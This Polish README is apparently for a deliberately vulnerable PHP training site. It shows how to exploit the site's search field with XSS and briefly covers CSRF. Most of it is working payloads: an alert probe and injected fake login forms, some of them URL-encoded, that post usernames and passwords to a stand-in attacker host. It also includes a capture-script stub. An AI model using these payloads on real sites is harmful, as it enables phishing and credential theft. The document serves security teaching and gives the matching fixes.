# Konfiguracja

* Wrzucić wszystkie pliki na serwer obsługujacy PHP.
* Uruchomić w przeglądarce stronę `index.php`
* W pole wyszukiwania `szukaj.php` wklejać poniższe przykłady kodu aby wyświetlić alert lub wstrzyknąć formularz przypominający logowanie, a w rzeczywistości wysyłający dane do hackera.



# XSS

### XSS - sprawdzanie podatności inputa

	"><script>alert('hacked');</script>



### XSS - kod wyświetlający fikcyjny formularz proszący o logowanie

	"><script>
	document.getElementById('container').innerHTML='<h1>Logowanie</h1>												 												
	Uwaga. Zostałeś wylogowany. Ze względów bezpieczeństwa jesteś proszony o ponowne zalogowanie.
	<form action="http://www.strona-hackera.pl/formularz_przechwytujacy_haslo.php" method="post">
	Login: <input type="text" name="login"><br />
	Hasło: <input type="password" name="password"><br />
	<input type="submit" name="submit" value="zaloguj" />
	</form>
	';
	</script>




### Kod dołączający bibliotekę jQuery z serwera Google


	<script type='text/javascript' src='http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>



### Kod dołączający bibliotekę jQuery z localhost 


	<script type='text/javascript' src='jquery.min.js'></script>



### XSS - kod wyświetlający fikcyjny formularz proszący o logowanie
Kod jest wywoływany dopiero po załadowaniu całego dokumentu DOM (Document Object Model).

	">
	<script type='text/javascript' src='jquery.min.js'></script>
	<script>
	$(function() {
	document.getElementById('container').innerHTML='<h1>Logowanie</h1>												 												
	Uwaga. Zostałeś wylogowany. Ze względów bezpieczeństwa jesteś proszony o ponowne zalogowanie.
	<form action="http://www.strona-hackera.pl/formularz_przechwytujacy_haslo.php" method="post">
	Login: <input type="text" name="login"><br />
	Hasło: <input type="password" name="password"><br />
	<input type="submit" name="submit" value="zaloguj" />
	</form>
	';
	})											
	</script>


Treść pliku `formularz_przechwytujacy_haslo.php` który znajduje się na serwerze hackera.
	
	<?

	// odczyt przechwyconych danych
	$_POST['login'];
	$_POST['password'];
	
	// wysłanie danych do hackera
	// mail() lub zapis do pliku
	// ...

	?>




### po parsowaniu 


	%22%3e%20%3c%73%63%72%69%70%74%20%74%79%70%65%3d%27%74%65%78%74%2f%6a%61%76%61%73%63%72%69%70%74%27%20%73%72%63%3d%27%6a%71%75%65%72%79%2e%6d%69%6e%2e%6a%73%27%3e%3c%2f%73%63%72%69%70%74%3e%20%3c%73%63%72%69%70%74%3e%20%24%28%66%75%6e%63%74%69%6f%6e%28%29%20%7b%20%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%27%63%6f%6e%74%61%69%6e%65%72%27%29%2e%69%6e%6e%65%72%48%54%4d%4c%3d%27%3c%68%31%3e%4c%6f%67%6f%77%61%6e%69%65%3c%2f%68%31%3e%20%55%77%61%67%61%2e%20%5a%6f%73%74%61%c5%82%65%c5%9b%20%77%79%6c%6f%67%6f%77%61%6e%79%2e%20%5a%65%20%77%7a%67%6c%c4%99%64%c3%b3%77%20%62%65%7a%70%69%65%63%7a%65%c5%84%73%74%77%61%20%6a%65%73%74%65%c5%9b%20%70%72%6f%73%7a%6f%6e%79%20%6f%20%70%6f%6e%6f%77%6e%65%20%7a%61%6c%6f%67%6f%77%61%6e%69%65%2e%20%3c%66%6f%72%6d%20%61%63%74%69%6f%6e%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%73%74%72%6f%6e%61%2d%68%61%63%6b%65%72%61%2e%70%6c%2f%66%6f%72%6d%75%6c%61%72%7a%5f%70%72%7a%65%63%68%77%79%74%75%6a%61%63%79%5f%68%61%73%6c%6f%2e%70%68%70%22%20%6d%65%74%68%6f%64%3d%22%70%6f%73%74%22%3e%20%4c%6f%67%69%6e%3a%20%3c%69%6e%70%75%74%20%74%79%70%65%3d%22%74%65%78%74%22%20%6e%61%6d%65%3d%22%6c%6f%67%69%6e%22%3e%3c%62%72%20%2f%3e%20%48%61%73%c5%82%6f%3a%20%3c%69%6e%70%75%74%20%74%79%70%65%3d%22%70%61%73%73%77%6f%72%64%22%20%6e%61%6d%65%3d%22%70%61%73%73%77%6f%72%64%22%3e%3c%62%72%20%2f%3e%20%3c%69%6e%70%75%74%20%74%79%70%65%3d%22%73%75%62%6d%69%74%22%20%6e%61%6d%65%3d%22%73%75%62%6d%69%74%22%20%76%61%6c%75%65%3d%22%7a%61%6c%6f%67%75%6a%22%20%2f%3e%20%3c%2f%66%6f%72%6d%3e%20%27%3b%20%7d%29%20%3c%2f%73%63%72%69%70%74%3e


### Ten sam kod co wyżej tylko z linkiem do biblioteki jquery umieszczonej na stronie Google


	">
	<script type='text/javascript' src='http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
	<script>
	$(function() {
	document.getElementById('container').innerHTML='<h1>Logowanie</h1>												 												
	Uwaga. Zostałeś wylogowany. Ze względów bezpieczeństwa jesteś proszony o ponowne zalogowanie.
	<form action="http://www.strona-hackera.pl/formularz_przechwytujacy_haslo.php" method="post">
	Login: <input type="text" name="login"><br />
	Hasło: <input type="password" name="password"><br />
	<input type="submit" name="submit" value="zaloguj" />
	</form>
	';
	})											
	</script>


* TIP: Aby zabezpieczyć pole wyszukiwania należy na $_GET['fraza'] wywołać funkcję htmlspecialchars





# CSRF

Użytkownik `jankowalski` klucz dla hasła: `qwerty` to `e98f3f7e74ae2a0093ece6ab335ee78ce98c9fa2`.


### Sposób zabezpieczenia formularza zmiany hasła:

Linia ~246

	if($password_1 == $password_2 AND $_COOKIE['session_key'] == $_POST['session_key'])

Do formularza należy dodać ukryty input:

	<input type="hidden" name="session_key" value="'.$_COOKIE['session_key'].'" />
